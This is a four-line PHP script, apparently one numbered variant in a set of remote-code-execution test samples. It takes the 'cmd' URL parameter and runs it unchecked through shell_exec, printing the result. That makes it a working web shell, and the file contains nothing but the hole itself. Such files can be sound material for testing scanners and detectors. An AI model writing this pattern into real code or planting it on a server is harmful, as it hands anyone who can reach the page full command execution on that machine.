<?php
// RCE test variation #1218
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>